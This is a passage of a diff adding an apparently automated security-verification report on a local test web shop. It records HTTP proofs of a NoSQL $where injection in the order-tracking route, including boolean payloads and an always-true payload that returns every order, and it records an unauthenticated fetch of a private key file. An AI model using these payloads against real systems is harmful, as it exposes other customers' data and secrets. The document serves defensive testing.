+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 22
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 351
+
+        etag: W/"15f-Rd+IOaQareJAbDyTa/Z/QaHTqhs"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:06 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      role: attack
+      role_label: true condition
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      facts:
+      - 'Compared with the false condition in step 33: same status 200; 17 of 18 JSON
+        values differ, e.g. /data/0/orderId: "5267-173e24c7ffc77007'' && (655396===661429)
+        && ''x''==''x" → "5267-173e24c7ffc77007"; /data/0/email: absent → "*dm*n@j**c*-sh.*p".'
+    - step: 33
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 14
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 98
+
+        etag: W/"62-eYw6urCaQwkmXY70LBH08DDs/5w"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:06 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007'' && (655396===661429)
+        && ''x''==''x"}]}'
+      role: attack
+      role_label: false condition
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28655396%3D%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007'' && (655396===661429)
+        && ''x''==''x"}]}'
+      facts:
+      - 'Compared with the normal request in step 26: same status 200; 17 of 18 JSON
+        values differ, e.g. /data/0/orderId: "5267-173e24c7ffc77007" → "5267-173e24c7ffc77007''
+        && (655396===661429) && ''x''==''x"; /data/0/email: "*dm*n@j**c*-sh.*p" →
+        absent.'
+    - step: 34
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 14
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 351
+
+        etag: W/"15f-Rd+IOaQareJAbDyTa/Z/QaHTqhs"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:06 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      role: attack
+      role_label: true condition, second form
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D655396%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"}]}'
+      facts:
+      - 'Compared with the false condition, second form in step 35: same status 200;
+        17 of 18 JSON values differ, e.g. /data/0/orderId: "5267-173e24c7ffc77007''
+        && (661429!==661429) && ''x''==''x" → "5267-173e24c7ffc77007"; /data/0/email:
+        absent → "*dm*n@j**c*-sh.*p".'
+    - step: 35
+      request: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 18
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 98
+
+        etag: W/"62-6AQS7ArgDP1xs10Uws6Qr2Qg4kw"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:48:06 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007'' && (661429!==661429)
+        && ''x''==''x"}]}'
+      role: attack
+      role_label: false condition, second form
+      request_excerpt: 'GET /rest/track-order/5267-173e24c7ffc77007%27%20%26%26%20%28661429%21%3D%3D661429%29%20%26%26%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007'' && (661429!==661429)
+        && ''x''==''x"}]}'
+      facts:
+      - 'Compared with the normal request in step 26: same status 200; 17 of 18 JSON
+        values differ, e.g. /data/0/orderId: "5267-173e24c7ffc77007" → "5267-173e24c7ffc77007''
+        && (661429!==661429) && ''x''==''x"; /data/0/email: "*dm*n@j**c*-sh.*p" →
+        absent.'
+    - step: 6
+      request: 'GET /rest/track-order/vrf23d9a53d%27%20%7C%7C%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 26
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 920
+
+        etag: W/"398-4Uz3aX+xRExTcY7U97S3HNaKZzA"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:47:06 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"},{"orderId":"5267-4e22edc919738607","email":"*dm*n@j**c*-sh.*p","totalPrice":26.97,"bonus":3,"products":[{"quantity":3,"name":"Eggfruit
+        Juice (500ml)","price":8.99,"total":26.97,"bonus":3}],"eta":"0","delivered":true,"_id":"h4nagernroPfFqsqo"},{"orderId":"fe01-5e9f89f06cff2ef9","email":"d*m*","totalPrice":30.92,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":5,"name":"Raspberry
+        Juice (1000ml)","price":4.99,"total":24.950000000000003,"bonus":0}],"eta":"0","delivered":true,"_id":"BrMSQYBxkYRyHELsS"}]}'
+      request_excerpt: 'GET /rest/track-order/vrf23d9a53d%27%20%7C%7C%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"},{"orderId":"5267-4e22edc919738607","email":"*dm*n@j**c*-sh.*p","totalPrice":26.97,"bonus":3,"products":[{"quantity":3,"name":"Eggfruit
+        Juice (500ml)","price":8.99,"total":26.97,"bonus":3}],"eta":"0","delivered":true,"_id":"h4nagernroPfFqsqo"},{"orderId":"fe01-5e9f89f06cff2ef9","email":"d*m*","totalPrice":30.92,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":5,"name":"Raspberry
+        Juice (1000ml)","price":4.99,"total":24.950000000000003,"bonus":0}],"eta":"0","delivered":true,"_id":"BrMSQYBxkYRyHELsS"}]}'
+      facts: []
+    - step: 9
+      request: 'GET /rest/track-order/vrf23d9a53d%27%20%7C%7C%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 19
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 920
+
+        etag: W/"398-4Uz3aX+xRExTcY7U97S3HNaKZzA"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:47:06 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"},{"orderId":"5267-4e22edc919738607","email":"*dm*n@j**c*-sh.*p","totalPrice":26.97,"bonus":3,"products":[{"quantity":3,"name":"Eggfruit
+        Juice (500ml)","price":8.99,"total":26.97,"bonus":3}],"eta":"0","delivered":true,"_id":"h4nagernroPfFqsqo"},{"orderId":"fe01-5e9f89f06cff2ef9","email":"d*m*","totalPrice":30.92,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":5,"name":"Raspberry
+        Juice (1000ml)","price":4.99,"total":24.950000000000003,"bonus":0}],"eta":"0","delivered":true,"_id":"BrMSQYBxkYRyHELsS"}]}'
+      request_excerpt: 'GET /rest/track-order/vrf23d9a53d%27%20%7C%7C%20%27x%27%3D%3D%27x
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"orderId":"5267-173e24c7ffc77007","email":"*dm*n@j**c*-sh.*p","totalPrice":8.96,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":1,"name":"Orange
+        Juice (1000ml)","price":2.99,"total":2.99,"bonus":0}],"eta":"3","delivered":false,"_id":"rvEY9Y64zbqypF7ii"},{"orderId":"5267-4e22edc919738607","email":"*dm*n@j**c*-sh.*p","totalPrice":26.97,"bonus":3,"products":[{"quantity":3,"name":"Eggfruit
+        Juice (500ml)","price":8.99,"total":26.97,"bonus":3}],"eta":"0","delivered":true,"_id":"h4nagernroPfFqsqo"},{"orderId":"fe01-5e9f89f06cff2ef9","email":"d*m*","totalPrice":30.92,"bonus":0,"products":[{"quantity":3,"name":"Apple
+        Juice (1000ml)","price":1.99,"total":5.97,"bonus":0},{"quantity":5,"name":"Raspberry
+        Juice (1000ml)","price":4.99,"total":24.950000000000003,"bonus":0}],"eta":"0","delivered":true,"_id":"BrMSQYBxkYRyHELsS"}]}'
+      facts: []
+  planning:
+  - step: 4
+    path: /rest/track-order/:id
+    hypothesis: id is spliced unescaped into a $where JS string `this.orderId ===
+      '${id}'`; closing the quote and appending || true matches every order document
+      (collection count >1), while a closing quote with an always-false tautology
+      matches none and falls back to the single synthetic element, distinguishing
+      true/false by presence of a second result element.
+  - step: 13
+    path: /rest/track-order/:id
+    hypothesis: id is spliced unescaped into the server-side JS $where predicate this.orderId
+      === '${id}'; appending && {{predicate}} && 'x'=='x after a known valid orderId
+      lets the injected predicate decide whether that order is returned, proving control
+      over the JS boolean expression.
+  - step: 25
+    path: /rest/track-order/:id
+    hypothesis: id is spliced unescaped into the server-side JS $where predicate this.orderId
+      === '${id}'; appending a closing quote plus && {{predicate}} && 'x'=='x after
+      a known valid orderId lets the injected predicate decide whether that real order
+      document (with its email field) is returned, versus the synthetic fallback object
+      lacking an email field.
+  evidence_review:
+    status: clear
+    rounds: 0
+    reviews: 1
+    visual_review: not-performed
+    images_reviewed: []
+    reason: Evidence text and layout checks passed; no screenshot shown to the model
+      (no application screenshot to show).
+    issues: []
+    presentations: []
+    variants:
+    - T-034-b2749fff0d93b959
+  technical_review:
+    status: not-reviewed
+    rounds: 0
+    reviews: 0
+    inspected_steps: []
+    reason: A confirmed verdict whose proof check passed is not reviewed (VER-046).
+    issues: []
+  selection_reason: null
+  target_location:
+    source_file: routes/trackOrder.ts
+    source_line: null
+  timing:
+    started: '2026-11-12T12:44:57.900584Z'
+    finished: '2026-11-12T12:48:24.079642Z'
+- result_id: VF-023
+  finding_ref:
+    id: T-034
+    match_key: routes/trackorder.ts|CWE-943
+    instance: routes/trackOrder.ts:18
+    title: NoSQL injection in order tracking $where predicate — routes/trackOrder.ts:18
+    cwe: CWE-943
+    variant: variant-002
+    variant_digest: d168c7928417db3854dfbd130e95dba02944288e86348ab42482345c2a856dbd
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/trackOrder.ts
+    source_line: null
+- result_id: VF-024
+  finding_ref:
+    id: T-037
+    match_key: routes/userprofile.ts|CWE-1336
+    instance: routes/userProfile.ts:87
+    title: User-controlled username compiled as Pug template — routes/userProfile.ts:87
+    cwe: CWE-1336
+    variant: variant-001
+    variant_digest: e621981cd5fd05511636501dfe70640d3c858e5d8b2e3cdd747933d6b70414b3
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: mechanism-specific'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/userProfile.ts
+    source_line: null
+- result_id: VF-025
+  finding_ref:
+    id: T-042
+    match_key: server.ts|CWE-639
+    instance: server.ts:365
+    title: Any authenticated user can read other users' records and all complaints
+    cwe: CWE-639
+    variant: variant-001
+    variant_digest: 92048fcb9600af54276b213e5e1bc95662194066d8ed5c5aebcde9f1a1b11da6
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-026
+  finding_ref:
+    id: T-042
+    match_key: server.ts|CWE-639
+    instance: server.ts:365
+    title: Any authenticated user can read other users' records and all complaints
+    cwe: CWE-639
+    variant: variant-002
+    variant_digest: 41ac70240366a449c7d106da49dff909b3daf1f34807c00743243667902f67d7
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-027
+  finding_ref:
+    id: T-042
+    match_key: server.ts|CWE-639
+    instance: server.ts:365
+    title: Any authenticated user can read other users' records and all complaints
+    cwe: CWE-639
+    variant: variant-003
+    variant_digest: fa8f9b3c88db7d17c86a959f030cdb0563dee2670c22fb3a2ce3fb1b1de02a10
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-028
+  finding_ref:
+    id: T-053
+    match_key: server.ts|CWE-639
+    instance: server.ts:388
+    title: Recycle records readable by any caller by ID — server.ts:388
+    cwe: CWE-639
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-029
+  finding_ref:
+    id: T-058
+    match_key: server.ts|CWE-862
+    instance: server.ts:278
+    title: Encryption keys and logs served without authorization — server.ts:278
+    cwe: CWE-862
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: confirmed
+  confidence: medium
+  rationale: Unauthenticated GET /encryptionkeys/premium.key, a non-public key file,
+    returned 200 with 50 bytes, identical to the signed-in account-1 answer. A random
+    path next to it returned 404. This addresses QA's public-key objection for the
+    encryptionkeys route. The /support/logs route was not tested.
+  proof:
+    checked: true
+    contract: 3
+    steps:
+    - 11
+    - 12
+    - 13
+    kind: access-control
+    form: comparison-without-credentials
+    tested_path: /encryptionkeys/premium.key
+    variant: null
+    hypothesis: A non-public encryption key file (premium.key) is served to unauthenticated
+      callers identical to a signed-in account, while a random path differs.
+    observation_pointer: null
+    scope: cited requests only; the same answer without credentials as for account-1
+      does not show that the function is meant for signed-in accounts only; that restriction
+      is taken from the finding; the answers were compared in code and are not kept
+  identities_used:
+  - account-1
+  - anonymous
+  state_changes: []
+  deviation: null
+  observations:
+  - /support/logs/:file was not tested separately
+  - jwt.pub is a public key; the premium.key result is the stronger proof
+  - 'Application screenshot unavailable: the compared answers are not shown (VER-057).'
+  limits_hit: null
+  evidence:
+  - kind: exchange
+    path: evidence/T-058-exchanges.json
+    redacted: true
+    sha256: 4fdf665a4de1dac587614653315b74316865625574cd98dfaf708a9ad26c9ee7
+  - kind: har
+    path: evidence/T-058-poc.har
+    redacted: true
+    sha256: e42e9f730b8dee03de31439a229d663397f5effc67826fba0c46ad3515e517c2
+    note: may show target data; review before sharing
+  - kind: screenshot
+    path: evidence/T-058-encryption-keys-and-logs-served-without-authorization-http-1.png
+    sha256: 371e06c246c5b0b37475c139f7a5dc5444da9fd10c3e3d42bb8bfdd5f617c438
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 1
+  - kind: screenshot
+    path: evidence/T-058-encryption-keys-and-logs-served-without-authorization-http-2.png
+    sha256: feefd1fc35235c016dde6f962969aaee1de1dba4d0466ea22b38bbbac73522cc
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+  - kind: screenshot
+    path: evidence/T-058-encryption-keys-and-logs-served-without-authorization-explanation-1.png
+    sha256: fed104ea90f43ef426237dd769354c9d50c810c5d614bc1c49292da6d1464941
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+    presentation_review: true
+  poc:
+    file: evidence/T-058-poc.har
+    steps:
+    - step: 2
+      line: http_request GET http://127.0.0.1:3000/encryptionkeys/jwt.pub as anonymous
+        → 200, 248 bytes
+      decisive: false
+    - step: 4
+      line: http_request GET http://127.0.0.1:3000/encryptionkeys/jwt.pub as account-1
+        → 200, 248 bytes
+      decisive: false
+    - step: 5
+      line: http_request GET http://127.0.0.1:3000/encryptionkeys/jwt.pub as anonymous
+        → 200, 248 bytes
+      decisive: false
+    - step: 6
+      line: http_request GET http://127.0.0.1:3000/encryptionkeys/vrf6bbb5b081502e6b2
+        as anonymous → 404, 1074 bytes
+      decisive: false
+    - step: 11
+      line: http_request GET http://127.0.0.1:3000/encryptionkeys/premium.key as account-1
+        → 200, 50 bytes
+      decisive: true
+    - step: 12
+      line: http_request GET http://127.0.0.1:3000/encryptionkeys/premium.key as anonymous
+        → 200, 50 bytes
+      decisive: true
+    - step: 13
+      line: http_request GET http://127.0.0.1:3000/encryptionkeys/vrf6bbb5b086970275e
+        as anonymous → 404, 1074 bytes
+      decisive: true
+    shown:
+    - step: 11
+      request: 'GET /encryptionkeys/premium.key HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+        authorization: [identity account-1]
+
+
+        '
+      elapsed_ms: 8
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        accept-ranges: bytes
+
+        cache-control: public, max-age=0
+
+        last-modified: Sun, 08 Nov 2026 19:09:13 GMT
+
+        etag: W/"32-1a1bc908fa8"
+
+        content-type: application/octet-stream
+
+        content-length: 50
+
+        date: Thu, 12 Nov 2026 12:49:46 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        [body not kept: compared in code only (VER-057), 50 bytes]'
+      role: normal
+      role_label: signed-in account
+      request_excerpt: 'GET /encryptionkeys/premium.key HTTP/1.1
+
+        authorization: ⟦[identity account-1]⟧
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/octet-stream
+
+
+        [body not kept: compared in code only (VER-057), 50 bytes]'
+      facts: []
+    - step: 13
+      request: 'GET /encryptionkeys/vrf6bbb5b086970275e HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 7
+      response: 'HTTP/1.1 404 Not Found
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: text/html; charset=utf-8
+
+        vary: Accept-Encoding
+
+        content-encoding: br
+
+        date: Thu, 12 Nov 2026 12:49:47 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+        transfer-encoding: chunked
+
+
+        [body not kept: compared in code only (VER-057), 1074 bytes]'
+      role: control
+      role_label: random path next to it, without login
+      request_excerpt: 'GET /encryptionkeys/vrf6bbb5b086970275e HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 404 Not Found
+
+        content-type: text/html; charset=utf-8
+
+
+        [body not kept: compared in code only (VER-057), 1074 bytes]'
+      facts: []
+    - step: 12
+      request: 'GET /encryptionkeys/premium.key HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 12
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        accept-ranges: bytes
+
+        cache-control: public, max-age=0
+
+        last-modified: Sun, 08 Nov 2026 19:09:13 GMT
+
+        etag: W/"32-1a1bc908fa8"
+
+        content-type: application/octet-stream
+
+        content-length: 50
+
+        date: Thu, 12 Nov 2026 12:49:47 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        [body not kept: compared in code only (VER-057), 50 bytes]'
+      role: attack
+      role_label: without login
+      request_excerpt: 'GET /encryptionkeys/premium.key HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/octet-stream
+
+
+        [body not kept: compared in code only (VER-057), 50 bytes]'
+      facts:
+      - 'Compared with the normal request in step 11: same status 200, the identical
+        answer, compared in code over the whole body, which is not kept.'
+  planning:
+  - step: 3
+    path: /encryptionkeys/jwt.pub
+    hypothesis: Encryption key file is served to unauthenticated callers identical
+      to signed-in account, and a random path differs.
+  - step: 10
+    path: /encryptionkeys/premium.key
+    hypothesis: A non-public encryption key file (premium.key) is served to unauthenticated
+      callers identical to a signed-in account, while a random path differs.
+  evidence_review:
+    status: clear
+    rounds: 1
+    reviews: 2
+    visual_review: not-performed
+    images_reviewed: []
+    reason: Evidence text and layout checks passed; no screenshot shown to the model
+      (no application screenshot to show).
+    issues: []
+    presentations:
+    - variant: T-058
+      explanation: Only the encryption-key route is established here; the /support/logs
+        part of the title was not tested and is unresolved. GET /encryptionkeys/premium.key
+        returned 200 with 50 bytes both as account-1 (step 11) and with no credentials
+        (step 12). A random neighbouring path returned 404 without credentials (step
+        13). The response bodies were not kept. The identical-answer comparison was
+        done in code, so the excerpts show matching status and headers but not the
+        key content. The finding's premise that this file is non-public is taken from
+        the finding itself, not shown by the test.
+      quotes:
+      - step: 12
+        part: response
+        text: HTTP/1.1 200 OK
+      - step: 12
+        part: request
+        text: GET /encryptionkeys/premium.key HTTP/1.1
+      - step: 13
+        part: response
+        text: HTTP/1.1 404 Not Found
+    variants:
+    - T-058
+  technical_review:
+    status: clear
+    rounds: 1
+    reviews: 2
+    inspected_steps: []
+    reason: No unresolved technical objections in the reviewed attempts.
+    issues: []
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+  timing:
+    started: '2026-11-12T12:48:39.606236Z'
+    finished: '2026-11-12T12:50:02.998028Z'
+- result_id: VF-030
+  finding_ref:
+    id: T-060
+    match_key: server.ts|CWE-862
+    instance: server.ts:363
+    title: Any authenticated user can list all user accounts — server.ts:363
+    cwe: CWE-862
+    variant: null
